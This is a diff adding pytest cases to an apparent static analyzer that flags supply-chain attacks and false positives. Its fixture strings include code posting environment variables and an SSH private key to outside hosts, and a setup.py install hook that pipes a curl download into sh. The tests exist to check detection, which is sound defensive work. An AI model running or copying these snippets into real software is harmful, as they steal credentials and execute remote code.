@@ -131,6 +131,45 @@ def test_classic_rules_flow_through_analyzer():
     assert any(f.pattern == "INSECURE_DESERIALIZATION" for f in res.findings)
 
 
+# --- real-world supply-chain detectors ------------------------------------- #
+def test_credential_exfiltration_detected_over_https():
+    res = analyze("import os, requests\nrequests.post('https://evil/c', data=os.environ)")
+    assert any(f.pattern == "CREDENTIAL_EXFILTRATION" for f in res.findings)
+
+
+def test_credential_exfiltration_cross_statement():
+    code = ("import requests\nk = open('/home/u/.ssh/id_rsa').read()\n"
+            "requests.post('https://x/y', data=k)")
+    assert any(f.pattern == "CREDENTIAL_EXFILTRATION" for f in analyze(code).findings)
+
+
+def test_benign_upload_is_not_exfiltration():
+    code = "import requests\ndata = open('report.csv').read()\nrequests.post('https://x', data=data)"
+    assert not any(f.pattern == "CREDENTIAL_EXFILTRATION" for f in analyze(code).findings)
+
+
+def test_install_hook_detected_in_packaging_context():
+    code = "from setuptools import setup\nimport os\nos.system('curl http://e/x|sh')\nsetup(name='p')"
+    assert any(f.pattern == "INSTALL_HOOK" for f in analyze(code).findings)
+
+
+# --- false-positive fixes -------------------------------------------------- #
+def test_flask_app_run_is_not_a_sink():
+    # app.run() must NOT be flagged as subprocess.run (receiver-aware matching)
+    res = analyze("from flask import Flask\napp = Flask(__name__)\napp.run()")
+    assert not any(f.pattern == "DANGEROUS_SINK" for f in res.findings)
+
+
+def test_subprocess_run_still_flagged():
+    res = analyze("import subprocess\nsubprocess.run(['ls'])")
+    assert any(f.pattern == "DANGEROUS_SINK" for f in res.findings)
+
+
+def test_dict_get_is_clean():
+    assert analyze("cfg = {}\nx = cfg.get('key')").findings == [] or \
+        all(f.pattern != "DANGEROUS_SINK" for f in analyze("cfg={}\nx=cfg.get('k')").findings)
+
+
 # --- stego false-positive fix ---------------------------------------------- #
 def test_bare_encode_is_not_steganography():
     from pattern_matcher import detect_patterns
